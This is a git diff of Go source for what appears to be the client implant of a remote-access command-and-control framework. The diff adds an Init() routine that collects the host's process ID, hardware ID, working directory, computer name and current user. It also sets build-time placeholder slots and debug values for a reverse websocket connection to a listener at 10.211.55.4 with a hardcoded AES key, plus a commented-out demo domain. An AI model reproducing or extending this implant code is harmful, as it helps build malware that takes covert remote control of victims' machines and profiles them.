@@ -18,8 +18,7 @@ import (
 
 var RemarkColor string = ""
 var GroupInfo string = ""
-var Host string = ""
-var Port string = ""
+var HostPort string = ""
 var ListenerName string = ""
 var HWID string = ""
 var SleepTime string = "5"
@@ -33,7 +32,45 @@ var IsDotNetFour bool = false
 var IsConnected bool
 var RemarkMessage string
 var RemarkClientColor string
+var WorkDir string = ""
+var Protocol string = ""
+var UserName string = ""
 
+func Init() {
+	ProcessID = GetProcessID()
+	HWID = GetHWID()
+	WorkDir = Getpwd()
+	ClientComputer = GetClientComputer()
+	UserName = GetCurrentUser()
+	ClrVersion = "1.0"
+
+	//release
+	Protocol = strings.ReplaceAll("PROTOCOLAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHJJJJKKKKLLLL", " ", "")
+	HostPort = strings.ReplaceAll("HostAAAABBBBPortAAAABBBBCCCCDDDD", " ", "")
+	ListenerName = strings.ReplaceAll("ListenNameAAAABBBBCCCCDDDD", " ", "")
+	URL = strings.ReplaceAll("URLAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHJJJJKKKKLLLL", " ", "")
+	AesKey = strings.ReplaceAll("AeskAAAABBBBCCCC", " ", "")
+
+	///Debug
+	HostPort = "10.211.55.4:8888"
+	Protocol = "Session/Reverse_Ws"
+	ListenerName = "www"
+	AesKey = "QWERt_CSDMAHUATW"
+	URL = "ws://10.211.55.4:5000/www"
+
+	//demo url
+	//url := "ws://www.sftech.shop:443//www"
+}
+
+func Getpwd() string {
+	cwd, err := os.Getwd()
+	if err != nil {
+		fmt.Printf("Failed to get current directory: %v\n", err)
+		//return
+	}
+	return cwd
+	//fmt.Printf("Current directory: %s\n", cwd)
+}
 func GetProcessID() string {
 	return strconv.Itoa(os.Getpid())
 }
@@ -66,17 +103,11 @@ func GetInternalIP() string {
 	return ""
 }
 
-func GetUserName() string {
-	username := os.Getenv("USERNAME")
-	return username
-}
-
 func GetCurrentUser() string {
 	usr, err := user.Current()
 	if err != nil {
 		return ""
 	}
-
 	return usr.Username
 }
 
@@ -112,6 +143,7 @@ func GetCurrentDirectory() string {
 	}
 	return dir
 }
+
 func GetLinuxVersion() string {
 	var osName, osVersion string
 	file, err := os.Open("/etc/os-release")
